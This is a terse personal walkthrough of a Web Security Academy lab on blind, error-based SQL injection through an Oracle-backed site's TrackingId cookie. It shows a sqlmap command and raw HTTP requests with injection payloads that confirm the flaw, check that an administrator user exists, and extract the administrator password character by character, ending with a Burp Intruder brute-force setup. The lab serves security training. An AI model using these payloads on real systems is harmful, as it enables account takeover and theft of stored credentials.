
oracle
##### Base request
GET /filter?category=Pets HTTP/2
Host: 0a0d0020045bf99180a803af0010003c.web-security-academy.net
Cookie: TrackingId=PED0ADMMNqVyeMAo; session=HnT5nKD5umO9mPoEVtAf37oP6CgSY5sP
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d0020045bf99180a803af0010003c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step1: Identify SQLi vulnerability 
Run sqlmap on possible vectors.
normally in the url and on the cookies.

The cookies can be mapped with:
_sqlmap -u "https://0a0d0020045bf99180a803af0010003c.web-security-academy.net/filter?category=Pets" --cookie='TrackingId=PED0ADMMNqVyeMAo; session=HnT5nKD5umO9mPoEVtAf37oP6CgSY5sP' -p "TrackingId" --param-filter="COOKIE" --skip="session" --level=2_

In this lab the _TrackingId_ cookie was vulnerable and CANNOT see any visible change at first. Try to break the backend and see if it displays error message. (Division by 0 error or summin)
##### Step2: Confirm the vulnerability
GET /filter?category=Pets HTTP/2
Host: 0a0d0020045bf99180a803af0010003c.web-security-academy.net
Cookie: TrackingId=PED0ADMMNqVyeMAo _' UNION (SELECT CASE WHEN (1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--_; session=HnT5nKD5umO9mPoEVtAf37oP6CgSY5sP
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d0020045bf99180a803af0010003c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


##### Step3: Confirm the existence of administrator user
GET /product?productId=6 HTTP/2
Host: 0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net
Cookie: TrackingId=Azz0AjGBIQfIehkH _' AND 1=(SELECT CASE WHEN (1=(SELECT 1 FROM users WHERE username ='administrator')) THEN 1 ELSE 0 END)--_; session=vaZ8eWHeYdMX5gz9ea6kRlTyZuqXfqss
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6d005e0495508b81d4cfcf009f00c5.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

##### Step4: Build Skelton to exfil administrator password 
I used this to double check if the SQUEEEAL syntax was correct by manually identifying the first 
char in the password. Skip the manual work if you're confident in you SQL capabilities.  

GET /filter?category=Pets HTTP/2
Host: 0a0d0020045bf99180a803af0010003c.web-security-academy.net
Cookie: TrackingId=PED0ADMMNqVyeMAo _' UNION (SELECT CASE WHEN ('a'=SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--_; session=HnT5nKD5umO9mPoEVtAf37oP6CgSY5sP
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d0020045bf99180a803af0010003c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


##### Step6: Craft the Intruder Cluster bomb attack
GET /filter?category=Pets HTTP/2
Host: 0a0d0020045bf99180a803af0010003c.web-security-academy.net
Cookie: TrackingId=PED0ADMMNqVyeMAo' UNION (SELECT CASE WHEN ('§a§'=SUBSTR((SELECT password FROM users WHERE username='administrator'), §1§, 1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--; session=HnT5nKD5umO9mPoEVtAf37oP6CgSY5sP
Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0d0020045bf99180a803af0010003c.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

Under **Payloads** add the following sets:
- **Payload set 1**: a-z, A-Z, 0-9     (Simple list)
- **Payload set 2**: 0-25                   (Numbers)   
##### Step7: Run the b-word
Sort after 500 and bam. 
Ez sit kid.